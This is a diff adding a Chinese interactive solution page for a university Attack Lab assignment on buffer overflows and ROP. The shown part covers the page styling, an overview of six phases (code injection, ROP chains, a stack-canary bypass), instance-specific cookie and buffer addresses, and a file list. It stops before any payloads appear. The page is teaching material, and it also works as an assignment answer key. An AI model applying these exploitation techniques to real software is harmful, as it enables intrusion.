@@ -1,0 +1,1376 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-deck="attacklab">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Attack Lab（target339）中文交互解题指引：栈帧、六个 phase 的 payload、ROP gadget 与 starget canary 绕过。">
+<title>Attack Lab 实验 · 缓冲区溢出与 ROP 中文交互版</title>
+<style>
+
+/* ==========================================================================
+   base.css —— 结构基础样式（所有风格共用）
+   只使用 CSS 变量，不含任何具体配色；由各主题覆盖变量与少量结构规则。
+   ========================================================================== */
+
+:root{
+  /* 颜色（每个主题必须覆盖） */
+  --bg:#f6f7f9; --card:#fff; --ink:#15181d; --muted:#697586; --line:#e4e7ec;
+  --accent:#2563eb; --accent-ink:#fff; --accent-soft:#eaf1ff;
+  --sign:#e5484d; --exp:#0b7fd4; --frac:#18915a; --warn:#b45309;
+  --sign-bg:#fdecec; --sign-fg:#a3262b; --sign-bd:#f6cdcf;
+  --exp-bg:#e8f2fd;  --exp-fg:#0a5f9e;  --exp-bd:#c7ddf5;
+  --frac-bg:#e9f7ef; --frac-fg:#116b43; --frac-bd:#c8e8d5;
+  --ok-bg:#f2fbf6; --ok-bd:#9ed3b4; --bad-bg:#fff5f5; --bad-bd:#f1b5b8;
+  --warn-bg:#fffbeb; --gray-bg:#eef1f5; --gray-fg:#5b6472;
+  --paper-soft:#fcfdfe; --code-bg:#f1f3f7; --code-bd:#e6e9ef;
+  --tbl-head:#f7f9fc; --tbl-hover:#fafbfd;
+  --sel-bg:#eef1f5;
+
+  /* 字体 */
+  --font-sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
+  --font-mono:ui-monospace,"SF Mono",SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --font-display:var(--font-sans);
+  --tracking-title:normal;
+
+  /* 形状 */
+  --radius:12px; --radius-sm:8px; --radius-pill:99px;
+  --border-w:1px; --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);
+  --shadow-card:none;
+  --card-border:var(--border-w) solid var(--line);
+
+  /* 布局 */
+  --page-max:1180px; --nav-w:236px; --gap:26px; --sec-pad:26px 28px;
+  --nav-sticky-top:64px; --anchor-offset:70px;
+  --font-size:16px; --line-height:1.75;
+}
+
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--font-sans);
+  font-size:var(--font-size);line-height:var(--line-height);-webkit-font-smoothing:antialiased}
+img{max-width:100%}
+
+/* ---------- 顶栏 ---------- */
+.topbar{position:sticky;top:0;z-index:50;background:var(--card);border-bottom:1px solid var(--line)}
+.topbar-in{max-width:var(--page-max);margin:0 auto;padding:10px 22px;display:flex;align-items:center;gap:14px}
+.brand{font-weight:700;letter-spacing:var(--tracking-title);font-family:var(--font-display)}
+.brand small{font-weight:500;color:var(--muted);margin-left:8px;font-size:12.5px}
+.progress{margin-left:auto;display:flex;align-items:center;gap:10px;font-size:12.5px;color:var(--muted)}
+.progress .bar{width:150px;height:6px;border-radius:var(--radius-pill);background:var(--line);overflow:hidden}
+.progress .bar>i{display:block;height:100%;width:0;background:var(--accent);transition:width .25s}
+
+/* ---------- 主体布局 ---------- */
+.layout{max-width:var(--page-max);margin:0 auto;padding:22px;display:grid;
+  grid-template-columns:var(--nav-w) minmax(0,1fr);gap:var(--gap)}
+main{min-width:0}
+/* 长 URL / 长标识符没有断行点，会把容器整个撑破（窄屏尤其明显）。
+   只作用于文本容器；表格故意不加，让它走 .tbl-wrap 的横向滚动。 */
+main p,main li,main dd,main dt,main h2,main h3,main h4,main h5,
+main .box,main .card,main .readout,main .puzzle,main .step{overflow-wrap:anywhere}
+
+/* ---------- 目录 ---------- */
+nav.toc{position:sticky;top:var(--nav-sticky-top);align-self:start;max-height:calc(100vh - 84px);overflow:auto;padding-right:4px}
+nav.toc h4{margin:0 0 8px;font-size:12px;letter-spacing:.12em;color:var(--muted);text-transform:uppercase;font-weight:600}
+nav.toc a{display:block;padding:7px 11px;border-radius:var(--radius-sm);color:var(--ink);opacity:.78;
+  text-decoration:none;font-size:14.5px;border-left:2.5px solid transparent}
+nav.toc a:hover{background:var(--sel-bg);opacity:1}
+nav.toc a.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent);font-weight:600;opacity:1}
+nav.toc a .n{display:inline-block;min-width:20px;color:var(--muted);font-size:12.5px;font-variant-numeric:tabular-nums}
+nav.toc a.active .n{color:var(--accent)}
+nav.toc .sub{padding-left:26px;font-size:13.5px;opacity:.7}
+
+/* ---------- 章节 ---------- */
+section{background:var(--card);border:var(--card-border);border-radius:var(--radius);
+  padding:var(--sec-pad);margin-bottom:22px;box-shadow:var(--shadow);scroll-margin-top:var(--anchor-offset)}
+section>h2{margin:0 0 6px;font-size:25px;letter-spacing:-.01em;font-family:var(--font-display)}
+section>.lede{color:var(--muted);margin:0 0 20px;font-size:14.5px}
+h3{font-size:18.5px;margin:26px 0 10px;padding-left:11px;border-left:3.5px solid var(--accent);font-family:var(--font-display)}
+h4{font-size:16px;margin:18px 0 8px;font-family:var(--font-display)}
+h5{font-size:15px;font-family:var(--font-display)}
+p{margin:10px 0}
+ul,ol{margin:10px 0;padding-left:22px}
+li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.89em;background:var(--code-bg);border:1px solid var(--code-bd);border-radius:5px;padding:1px 5px}
+.mono{font-family:var(--font-mono)}
+a{color:var(--accent)}
+hr{border:0;border-top:1px dashed var(--line);margin:24px 0}
+.srcref{font-size:11.5px;color:var(--muted);font-weight:500;font-family:var(--font-sans);margin-left:8px;vertical-align:middle;white-space:nowrap;opacity:.75}
+.en{color:var(--muted);font-size:.92em}
+
+/* ---------- 栅格与卡片 ---------- */
+.grid{display:grid;gap:14px}
+.g2{grid-template-columns:repeat(2,minmax(0,1fr))}
+.g3{grid-template-columns:repeat(3,minmax(0,1fr))}
+/* 窄屏单列：必须用 minmax(0,1fr)。写成 1fr 时轨道最小宽度是 auto，
+   单元格里只要有长代码行（<pre>）就撑破容器，整页横向溢出。 */
+@media(max-width:820px){.g2,.g3{grid-template-columns:minmax(0,1fr)}}
+.card{border:var(--card-border);border-radius:var(--radius-sm);padding:15px 17px;background:var(--paper-soft);box-shadow:var(--shadow-card)}
+.card h5{margin:0 0 7px}
+.card.pad0{padding:0;overflow:hidden}
+
+/* ---------- 提示框 ---------- */
+.box{border:1px solid var(--line);border-left:4px solid var(--accent);background:var(--accent-soft);
+  border-radius:var(--radius-sm);padding:12px 16px;margin:14px 0}
+.box.warn{border-left-color:var(--warn);background:var(--warn-bg)}
+.box.bad{border-left-color:var(--sign);background:var(--bad-bg)}
+.box.ok{border-left-color:var(--frac);background:var(--ok-bg)}
+.box .t{font-weight:650;font-size:14.5px;margin-bottom:2px}
+
+/* ---------- 公式 ---------- */
+.formula{font-family:var(--font-mono);background:var(--paper-soft);border:1px solid var(--line);
+  border-radius:var(--radius-sm);padding:14px 17px;margin:14px 0;font-size:16.5px;text-align:center;overflow-x:auto}
+.formula.big{font-size:20px}
+
+/* ---------- 表格 ---------- */
+table.tbl{width:100%;border-collapse:collapse;font-size:14.5px;margin:14px 0}
+table.tbl th,table.tbl td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+table.tbl th{background:var(--tbl-head);font-weight:650;font-size:13.5px;white-space:nowrap}
+table.tbl td.mono,table.tbl th.mono{font-family:var(--font-mono);font-size:13.5px}
+table.tbl tr:hover td{background:var(--tbl-hover)}
+/* 当前行高亮：interactive 表格用它标出「正在看的那一行」。
+   注意 --tbl-hover 是悬停色，深色皮肤下故意比底色亮，所以 hl 用同一套变量。 */
+table.tbl tr.hl td{background:var(--sel-bg)}
+.tbl-wrap{overflow-x:auto}
+
+/* ---------- 位串控件 ---------- */
+.fw{display:flex;flex-wrap:wrap;gap:8px 18px;align-items:flex-start;margin:4px 0 2px;min-width:0}
+.fgrp{min-width:0}
+.fcap{font-size:12px;color:var(--muted);margin-bottom:4px;font-weight:600}
+.fcap b{font-family:var(--font-mono);font-size:12.5px}
+.bits{display:flex;flex-wrap:wrap;gap:2px;font-family:var(--font-mono);margin:4px 0}
+.bits .b{width:25px;height:33px;display:flex;align-items:center;justify-content:center;
+  border-radius:6px;font-size:15px;cursor:pointer;user-select:none;border:1px solid transparent;
+  transition:transform .06s,background .12s;font-weight:600}
+.bits .b:hover{transform:translateY(-2px)}
+.bits .b.s{background:var(--sign-bg);color:var(--sign-fg);border-color:var(--sign-bd)}
+.bits .b.e{background:var(--exp-bg);color:var(--exp-fg);border-color:var(--exp-bd)}
+.bits .b.f{background:var(--frac-bg);color:var(--frac-fg);border-color:var(--frac-bd)}
+.bits .b.sel{outline:2px solid var(--ink);outline-offset:1px}
+.bits.sm .b{width:19px;height:26px;font-size:12px;border-radius:4px}
+.fgrp .bits{flex-wrap:wrap;max-width:100%;gap:2px}
+.fgrp.ge .bits{max-width:300px}
+
+/* ---------- 读数表 ---------- */
+.readout{display:grid;grid-template-columns:auto 1fr;gap:4px 16px;font-size:14.5px;margin:12px 0}
+.readout dt{color:var(--muted);font-weight:600;font-family:var(--font-mono);font-size:13.5px;padding-top:2px}
+.readout dd{margin:0;font-family:var(--font-mono)}
+
+/* ---------- 小标签 ---------- */
+.chip{display:inline-block;font-size:12.5px;padding:2px 9px;border-radius:var(--radius-pill);
+  background:var(--accent-soft);color:var(--accent);font-weight:600}
+.chip.ok{background:var(--frac-bg);color:var(--frac-fg)}
+.chip.bad{background:var(--sign-bg);color:var(--sign-fg)}
+.chip.warn{background:var(--warn-bg);color:var(--warn)}
+.chip.gray{background:var(--gray-bg);color:var(--gray-fg)}
+.kbd{font-family:var(--font-mono);font-size:13px;background:var(--code-bg);border:1px solid var(--code-bd);
+  border-bottom-width:2px;border-radius:6px;padding:1px 7px}
+
+/* ---------- 控件 ---------- */
+.ctrls{display:flex;flex-wrap:wrap;gap:9px;align-items:center;margin:12px 0}
+label.fld{display:inline-flex;align-items:center;gap:7px;font-size:14px;color:var(--ink);max-width:100%;flex-wrap:wrap;min-width:0}
+label.fld select,label.fld input{min-width:0;max-width:100%}
+input[type=text],input[type=number],select{font-family:var(--font-mono);font-size:14px;padding:6px 10px;
+  border:1px solid var(--line);border-radius:var(--radius-sm);background:var(--card);color:var(--ink)}
+input[type=text]:focus,input[type=number]:focus,select:focus{outline:2px solid var(--accent-soft);border-color:var(--accent)}
+button{font-family:var(--font-sans);font-size:14px;font-weight:600;padding:7px 15px;border-radius:var(--radius-sm);
+  border:1px solid var(--line);background:var(--card);color:var(--ink);cursor:pointer}
+button:hover{background:var(--sel-bg)}
+button.p{background:var(--accent);border-color:var(--accent);color:var(--accent-ink)}
+button.sm{padding:4px 10px;font-size:13px}
+button.pill{border-radius:var(--radius-pill)}
+/* 按钮组默认不换行：项一多就会把 .ctrls 撑破。允许它缩到容器宽度并横向滚动。 */
+.seg{display:inline-flex;max-width:100%;border:1px solid var(--line);
+  border-radius:var(--radius-sm);overflow-x:auto;overflow-y:hidden}
+.seg button{border:0;border-radius:0;border-right:1px solid var(--line);padding:6px 13px}
+.seg button:last-child{border-right:0}
+.seg button.on{background:var(--accent);color:var(--accent-ink)}
+
+/* ---------- 分步演示 ---------- */
+/* .steps 是 .step 的包裹层（skill 词汇表里列了但一直没定义）——
+   仅给一点上下留白，步骤块自己的边距由 .step 负责。 */
+.steps{margin:12px 0}
+.step{border:1px solid var(--line);border-radius:var(--radius-sm);padding:11px 15px;margin:9px 0;
+  background:var(--paper-soft);opacity:.42;transition:opacity .2s}
+.step.on{opacity:1;background:var(--card)}
+.step .h{font-size:13px;font-weight:700;color:var(--accent);letter-spacing:.02em;margin-bottom:3px}
+.step .m{font-family:var(--font-mono);font-size:14.5px;overflow-x:auto}
+.step .e{font-size:13.5px;color:var(--muted);margin-top:3px}
+
+/* ---------- 折叠与答案 ---------- */
+.reveal{border:1px solid var(--line);border-radius:var(--radius-sm);padding:11px 15px;margin:8px 0;background:var(--paper-soft)}
+.reveal summary{cursor:pointer;font-weight:600;font-size:14.5px}
+.reveal[open]{background:var(--card)}
+.ans{margin-top:8px;padding-top:8px;border-top:1px dashed var(--line);font-size:14.5px}
+
+/* ---------- 判断题 ---------- */
+.puzzle{border:1px solid var(--line);border-radius:var(--radius-sm);padding:12px 15px;margin:9px 0;
+  display:flex;gap:13px;align-items:flex-start;background:var(--paper-soft)}
+.puzzle .q{font-family:var(--font-mono);font-size:15px;flex:1;min-width:0;overflow-x:auto;white-space:nowrap}
+.puzzle .q small{font-family:var(--font-sans);color:var(--muted);display:block;white-space:normal}
+.puzzle .btns{display:flex;gap:6px;flex-shrink:0}
+.puzzle.correct{border-color:var(--ok-bd);background:var(--ok-bg)}
+.puzzle.wrong{border-color:var(--bad-bd);background:var(--bad-bg)}
+.puzzle .exp{margin-top:9px;padding-top:9px;border-top:1px dashed var(--line);font-size:14.5px;
+  display:none;white-space:normal;font-family:var(--font-sans)}
+.puzzle.done .exp{display:block}
+.puzzle .exp .verdict{font-weight:700}
+
+/* ---------- 分布图 ---------- */
+.tick{stroke:#94a3b8;stroke-width:1.4}
+.tick.dn{stroke:var(--exp)}
+.tick.nm{stroke:var(--frac)}
+.ticklabel{font-size:9.5px;fill:var(--muted);font-family:var(--font-mono)}
+.axisline{stroke:var(--line);stroke-width:1.2}
+.axislabel{font-size:11px;fill:var(--muted)}
+
+/* ---------- 页脚 / 回到顶部 ---------- */
+.footer{max-width:var(--page-max);margin:0 auto;padding:8px 22px 40px;color:var(--muted);font-size:13px}
+.totop{position:fixed;right:22px;bottom:22px;z-index:40;box-shadow:var(--shadow);display:none}
+
+/* ---------- 响应式 ---------- */
+@media(max-width:960px){
+  .layout{grid-template-columns:1fr;padding:16px}
+  nav.toc{position:static;max-height:none;display:flex;flex-wrap:wrap;gap:6px;
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:10px}
+  nav.toc h4{width:100%;margin-bottom:2px}
+  nav.toc a{border-left:0;padding:5px 10px;font-size:13px}
+  nav.toc .sub{display:none}
+  section{padding:20px 17px}
+}
+@media print{
+  nav.toc,.topbar,.totop{display:none}
+  .layout{display:block}
+  section{break-inside:avoid;box-shadow:none}
+}
+
+
+/* ---------- 风格切换条（各主题通用） ---------- */
+.stylebar{max-width:var(--page-max);margin:0 auto;padding:14px 22px 0;display:flex;gap:8px;
+  flex-wrap:wrap;align-items:center;font-size:12.5px;color:var(--muted)}
+.stylebar>span{font-weight:600}
+.stylebar a{text-decoration:none;padding:4px 11px;border:1px solid var(--line);border-radius:var(--radius-pill);
+  color:var(--muted);background:var(--card);font-weight:600}
+.stylebar a:hover{border-color:var(--accent);color:var(--accent)}
+.stylebar a.cur{background:var(--accent);color:var(--accent-ink);border-color:var(--accent)}
+.stylebar>span{flex:0 0 auto}
+@media(max-width:960px){.stylebar{padding:12px 16px 0}}
+/* 25 讲之后药丸很多：窄屏折行会吃掉大半屏，改成单行横滑 */
+@media(max-width:820px){.stylebar{flex-wrap:nowrap;overflow-x:auto;-webkit-overflow-scrolling:touch;
+  scrollbar-width:thin}.stylebar a{flex:0 0 auto;font-size:12px;padding:4px 10px}}
+
+/* ---------- 本实验新增的少量样式 ---------- */
+  textarea{font-family:var(--font-mono);font-size:13px;line-height:1.6;resize:vertical}
+  textarea:focus{outline:2px solid var(--accent-soft);border-color:var(--accent)}
+  details.reveal+.reveal{margin-top:6px}
+
+
+/* ---------- Attack Lab 页面专用 ---------- */
+.cfg{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px 18px;margin:12px 0}
+@media(max-width:820px){.cfg{grid-template-columns:minmax(0,1fr)}}
+.cfg .fld{display:flex;flex-direction:column;align-items:stretch;gap:5px;font-size:13.5px;color:var(--muted)}
+.cfg .fld input{width:100%}
+.cfg-note{font-size:12.5px;color:var(--muted);margin-top:6px}
+.cfg-msg{min-height:1.4em}
+
+.phase-title{display:flex;flex-wrap:wrap;align-items:baseline;gap:10px}
+.phase-title .who{font-family:var(--font-mono);font-size:12.5px;color:var(--muted);font-weight:500}
+.phase-goal{border-left:4px solid var(--accent);background:var(--accent-soft);padding:10px 14px;border-radius:var(--radius-sm);margin:12px 0}
+.phase-goal b{font-family:var(--font-mono)}
+
+.amem{border:1px solid var(--line);border-radius:var(--radius-sm);overflow:hidden;margin:14px 0;background:var(--paper-soft)}
+.amem .row{display:grid;grid-template-columns:112px minmax(0,1fr) 118px;align-items:stretch;border-bottom:1px solid var(--line)}
+.amem .row:last-child{border-bottom:0}
+.amem .off{font-family:var(--font-mono);font-size:12.5px;color:var(--muted);padding:8px 10px;background:var(--code-bg);border-right:1px solid var(--line);white-space:nowrap}
+.amem .blk{font-family:var(--font-mono);font-size:13px;padding:8px 12px;display:flex;align-items:center;min-height:38px;overflow-wrap:anywhere}
+.amem .note{font-size:12.5px;color:var(--muted);padding:8px 10px;border-left:1px dashed var(--line);display:flex;align-items:center}
+.amem .buf{background:var(--accent-soft)}
+.amem .code{background:var(--frac-bg);color:var(--frac-fg)}
+.amem .canary{background:var(--warn-bg);color:var(--warn)}
+.amem .ret{background:var(--sign-bg);color:var(--sign-fg)}
+.amem .chain{background:var(--exp-bg);color:var(--exp-fg)}
+.amem .junk{background:var(--gray-bg);color:var(--gray-fg)}
+@media(max-width:700px){.amem .row{grid-template-columns:96px minmax(0,1fr)}.amem .off{font-size:11.5px;padding:8px 6px}.amem .note{display:none}}
+
+.hexbox{font-family:var(--font-mono);font-size:13px;line-height:1.65;background:var(--code-bg);border:1px solid var(--code-bd);
+  border-radius:var(--radius-sm);padding:12px 14px;margin:10px 0;overflow:auto;max-height:none;white-space:pre}
+.hexbox.cmd{max-height:none;background:var(--paper-soft)}
+.pltools{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:10px 0 0}
+.pltools .chip{margin-right:auto}
+.builder{border:1px solid var(--line);border-radius:var(--radius-sm);padding:12px 14px;margin:14px 0;background:var(--paper-soft)}
+.builder .bh{font-weight:650;font-size:14px;margin-bottom:2px}
+.builder .bs{font-size:12.5px;color:var(--muted);margin-bottom:8px}
+
+.addr{font-family:var(--font-mono);font-size:13px;background:var(--code-bg);border:1px solid var(--code-bd);border-radius:4px;padding:1px 6px;white-space:nowrap}
+.gadget{font-family:var(--font-mono);font-size:13px;white-space:nowrap}
+.gadget .a{color:var(--accent);font-weight:650}
+
+.kv{display:grid;grid-template-columns:auto minmax(0,1fr);gap:5px 14px;font-size:14px;margin:10px 0}
+.kv dt{color:var(--muted);font-weight:600}
+.kv dd{margin:0;font-family:var(--font-mono);overflow-wrap:anywhere}
+
+.checklist{display:grid;gap:8px;margin:12px 0}
+.checkitem{display:flex;gap:11px;align-items:flex-start;border:1px solid var(--line);border-radius:var(--radius-sm);padding:10px 13px;background:var(--paper-soft)}
+.checkitem input{margin-top:4px;flex:0 0 auto}
+.checkitem .ct{font-weight:650;font-size:14.5px}
+.checkitem .cm{font-size:13px;color:var(--muted)}
+.checkitem.done{border-color:var(--ok-bd);background:var(--ok-bg)}
+
+.copyrow{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:8px 0}
+.small{font-size:12.5px;color:var(--muted)}
+.warnline{color:var(--warn);font-weight:600}
+.okline{color:var(--frac);font-weight:650}
+.badline{color:var(--sign);font-weight:650}
+.tabbar{display:flex;flex-wrap:wrap;gap:6px;margin:12px 0}
+.tabbar button{border-radius:var(--radius-pill);padding:5px 12px;font-size:13px}
+.tabbar button.on{background:var(--accent);border-color:var(--accent);color:var(--accent-ink)}
+.tip{font-size:13px;color:var(--muted);border-top:1px dashed var(--line);margin-top:12px;padding-top:10px}
+.two-col{columns:2;column-gap:26px}
+@media(max-width:820px){.two-col{columns:1}}
+.nobreak{break-inside:avoid}
+
+
+@media(max-width:700px){
+  .brand{font-size:14px;line-height:1.3}
+  .brand small{display:block;margin-left:0;font-size:11px}
+  .topbar-in{padding:9px 14px;gap:8px}
+  .progress{font-size:11.5px}
+  .progress .bar{width:70px}
+  table.tbl{font-size:13px}
+  table.tbl th,table.tbl td{padding:6px 8px}
+}
+</style>
+</head>
+<body>
+
+<div class="topbar"><div class="topbar-in">
+  <div class="brand">Attack Lab: Buffer Overflow &amp; ROP<small>PKU-ICS 实验手册 · 中文交互版</small></div>
+  <div class="progress"><span id="pgText">通关进度 0/6</span><span class="bar"><i id="pgBar"></i></span></div>
+</div></div>
+<div class="stylebar">
+  <span>课件：</span>
+  <a href="ics01-zh.html" title="第 1 讲 · 课程概述">第 1 讲</a>
+  <a href="bits-bytes-ints-zh.html" title="第 2 讲 · 位、字节与整数">第 2 讲</a>
+  <a href="floating-point-zh.html" title="第 3 讲 · 浮点数">第 3 讲</a>
+  <a href="ics04-zh.html" title="第 4 讲 · 机器级编程 I：基础">第 4 讲</a>
+  <a href="ics05-zh.html" title="第 5 讲 · 机器级编程 II：控制">第 5 讲</a>
+  <a href="ics06-zh.html" title="第 6 讲 · 机器级编程 III：过程">第 6 讲</a>
+  <a href="ics07-zh.html" title="第 7 讲 · 机器级编程 IV：数据">第 7 讲</a>
+  <a href="ics08-zh.html" title="第 8 讲 · 机器级编程 V：高级">第 8 讲</a>
+  <a href="ics09-zh.html" title="第 9 讲 · 处理器体系结构：ISA 与逻辑">第 9 讲</a>
+  <a href="ics10-zh.html" title="第 10 讲 · 处理器体系结构：顺序实现">第 10 讲</a>
+  <a href="ics11-zh.html" title="第 11 讲 · 处理器体系结构：流水线">第 11 讲</a>
+  <a href="ics12-zh.html" title="第 12 讲 · 存储层次结构">第 12 讲</a>
+  <a href="ics13-zh.html" title="第 13 讲 · 缓存存储器">第 13 讲</a>
+  <a href="ics14-zh.html" title="第 14 讲 · 代码优化">第 14 讲</a>
+  <a href="ics15-zh.html" title="第 15 讲 · 链接">第 15 讲</a>
+  <a href="ics16-zh.html" title="第 16 讲 · 异常控制流 I">第 16 讲</a>
+  <a href="ics17-zh.html" title="第 17 讲 · 异常控制流 II">第 17 讲</a>
+  <a href="ics18-zh.html" title="第 18 讲 · 系统级 I/O">第 18 讲</a>
+  <a href="ics19-zh.html" title="第 19 讲 · 虚拟内存 I">第 19 讲</a>
+  <a href="ics20-zh.html" title="第 20 讲 · 虚拟内存 II">第 20 讲</a>
+  <a href="ics21-zh.html" title="第 21 讲 · 动态内存分配">第 21 讲</a>
+  <a href="ics22-zh.html" title="第 22 讲 · 网络基础">第 22 讲</a>
+  <a href="ics23-zh.html" title="第 23 讲 · 网络编程">第 23 讲</a>
+  <a href="ics24-zh.html" title="第 24 讲 · 并发编程">第 24 讲</a>
+  <a href="ics25-zh.html" title="第 25 讲 · 同步">第 25 讲</a>
+  <a href="datalab-zh.html" title="Data Lab 实验">Data Lab 实验</a>
+  <a href="bomblab-zh.html" title="Bomb Lab 实验">Bomb Lab 实验</a>
+  
+  <a href="attacklab-zh.html" class="cur" onclick="return false" title="Attack Lab 实验">Attack Lab 实验（当前）</a>
+</div>
+<noscript><div style="max-width:1180px;margin:0 auto;padding:0 22px"><div class="box bad"><div class="t">需要 JavaScript</div>本页的 payload 生成器、复制按钮和进度条都依赖 JavaScript。请启用后刷新；正文的讲解仍可直接阅读。</div></div></noscript>
+<div class="layout">
+  <nav class="toc">
+    <h4>目录</h4>
+    <a href="#s0"><span class="n">0</span>实验导览</a>
+    <a href="#s1"><span class="n">1</span>getbuf 的栈帧</a>
+    <a href="#s2"><span class="n">2</span>Phase 1 · 重定向</a>
+    <a href="#s3"><span class="n">3</span>Phase 2 · 注入代码</a>
+    <a href="#s4"><span class="n">4</span>Phase 3 · 注入字符串</a>
+    <a href="#s5"><span class="n">5</span>ROP 与 gadget</a>
+    <a href="#s6"><span class="n">6</span>Phase 4 · ROP touch2</a>
+    <a href="#s7"><span class="n">7</span>Phase 5 · ROP touch3</a>
+    <a href="#s8"><span class="n">8</span>Phase 6 · canary</a>
+    <a href="#s9"><span class="n">9</span>通关核对与排错</a>
+    <a href="#s10"><span class="n">10</span>附录</a>
+  </nav>
+
+  <main>
+<!-- ============================================================
+     Attack Lab · Buffer Overflow & Return-Oriented Programming
+     中文交互版正文。所有地址与 payload 都来自本实例 target339.tar：
+     cookie 0x29b55047，ctarget 缓冲区 0x55639868。
+     ============================================================ -->
+
+  <!-- ================= 0 实验导览 ================= -->
+  <section id="s0">
+    <h2>0. 实验导览</h2>
+    <p class="lede">Attack Lab 是 ICS 的第三个实验：前三个 phase 让你往 <code>ctarget</code> 的栈上注入并执行自己的机器码；后三个 phase 面对开启了栈不可执行（NX）的 <code>rtarget</code> / <code>starget</code>，只能用程序里现成的指令片段（gadget）拼出 return-oriented programming（ROP）链。本页把六个 phase 的拆解思路、栈布局、gadget 地址和可直接使用的 payload 全部整理出来。</p>
+
+    <div class="g2">
+      <div class="card">
+        <h3>这个实验考什么</h3>
+        <p>不给源码，只给三个 ELF 可执行文件和一个 <code>farm.c</code>。你需要读懂 <code>getbuf</code> 的栈帧，算出返回地址的位置，再决定是注入代码、还是拼 ROP 链。</p>
+        <p>它对应教材里「机器级编程」与「缓冲区溢出」两章：栈帧、<code>call</code>/<code>ret</code>、寄存器传参、字节序、变长指令解码，缺一不可。</p>
+      </div>
+      <div class="card">
+        <h3>本实例的基本信息</h3>
+        <dl class="kv">
+          <dt>实例编号</dt><dd>339</dd>
+          <dt>Cookie</dt><dd>0x29b55047</dd>
+          <dt>ctarget 缓冲区</dt><dd>0x55639868</dd>
+          <dt>架构</dt><dd>x86-64 · 非 PIE · 未 strip</dd>
+          <dt>阶段数</dt><dd>6（ctarget 3 + rtarget 2 + starget 1）</dd>
+        </dl>
+        <p class="small">Cookie 写在 <code>cookie.txt</code> 里；缓冲区地址来自 <code>gdb</code> 在 <code>getbuf</code> 入口处读到的 <code>$rsp</code>。两者都是「本实例」的值，换一个 tar 就要重新取。</p>
+      </div>
+    </div>
+
+    <h3>六个 phase 一览</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>#</th><th>目标程序</th><th>要调用的函数</th><th>核心手法</th><th>通关标志</th></tr>
+        <tr><td class="mono">1</td><td class="mono">ctarget</td><td class="mono">touch1()</td><td>覆盖返回地址</td><td class="mono">level 1 · Touch1!</td></tr>
+        <tr><td class="mono">2</td><td class="mono">ctarget</td><td class="mono">touch2(cookie)</td><td>注入 <code>mov $cookie,%edi; ret</code></td><td class="mono">level 2 · Touch2!</td></tr>
+        <tr><td class="mono">3</td><td class="mono">ctarget</td><td class="mono">touch3("29b55047")</td><td>注入代码 + 注入字符串</td><td class="mono">level 3 · Touch3!</td></tr>
+        <tr><td class="mono">4</td><td class="mono">rtarget</td><td class="mono">touch2(cookie)</td><td>ROP：<code>pop rax</code> + <code>mov rdi,rax</code></td><td class="mono">level 2 · Touch2!</td></tr>
+        <tr><td class="mono">5</td><td class="mono">rtarget</td><td class="mono">touch3("29b55047")</td><td>ROP：用 <code>rsp</code> 算字符串地址</td><td class="mono">level 3 · Touch3!</td></tr>
+        <tr><td class="mono">6</td><td class="mono">starget</td><td class="mono">touch3("29b55047")</td><td>绕过 canary：劫持 <code>memcpy</code> 的返回地址</td><td class="mono">level 3 · Touch3!</td></tr>
+      </table>
+    </div>
+    <div class="box warn"><div class="t">关于 rtarget / starget 的 “level” 编号</div>
+      本实例的 <code>rtarget</code> 把 ROP 两关内部记作 level 2、level 3，<code>starget</code> 记作 level 3；它们分别对应实验说明里的第 4、5、6 关。看到 <code>Valid solution for level 2 with target rtarget</code> 不用慌，那就是第 4 关过了。
+    </div>
+
+    <div class="box pad0" style="padding:16px 18px">
+      <div class="ctrls">
+        <span style="font-weight:650;font-size:14.5px">交互：本实例参数——改 cookie 或缓冲区地址，下面所有 payload 会跟着重算</span>
+      </div>
+      <div class="cfg">
+        <label class="fld">Cookie（十六进制）
+          <input type="text" id="cfgCookie" value="0x29b55047" spellcheck="false" autocomplete="off">
+        </label>
+        <label class="fld">ctarget 缓冲区地址（十六进制）
+          <input type="text" id="cfgBuf" value="0x55639868" spellcheck="false" autocomplete="off">
+        </label>
+      </div>
+      <div class="copyrow">
+        <button class="sm" id="cfgReset">恢复本实例</button>
+        <span class="small">只有 ctarget 的 phase 2、3 需要缓冲区地址；rtarget / starget 的链不依赖绝对栈地址。</span>
+      </div>
+      <div id="cfgMsg" class="cfg-msg"></div>
+    </div>
+
+    <h3>文件清单</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>文件</th><th>用途</th><th>本页会用到的信息</th></tr>
+        <tr><td class="mono">ctarget</td><td>可注入代码的目标（phase 1–3）</td><td><code>getbuf</code>、<code>touch1/2/3</code> 的地址</td></tr>
+        <tr><td class="mono">rtarget</td><td>NX 开启，只能 ROP（phase 4–5）</td><td>gadget farm、<code>touch2/3</code> 地址</td></tr>
+        <tr><td class="mono">starget</td><td>canary + ROP（phase 6）</td><td><code>getbuf_withcanary</code>、gadget farm</td></tr>
+        <tr><td class="mono">farm.c</td><td>gadget farm 的源码</td><td>用 <code>-Og</code> 编译后对照反汇编找字节序列</td></tr>
+        <tr><td class="mono">cookie.txt</td><td>本实例的 4 字节签名</td><td><code>0x29b55047</code></td></tr>
+        <tr><td class="mono">hex2raw</td><td>把十六进制文本转成原始字节</td><td>所有 payload 的落盘工具</td></tr>
+      </table>
+    </div>
+
+    <h3>三条工作约定</h3>
+    <div class="steps">
+      <div class="step on"><div class="h">先算地址，再写 payload</div><div class="m">栈地址、函数地址、gadget 地址全部先用 <code>gdb</code> / <code>objdump</code> 确认</div><div class="e">不要照抄别人的地址——每个 tar 的 <code>buf_offset</code> 和 farm 布局都可能不同。</div></div>
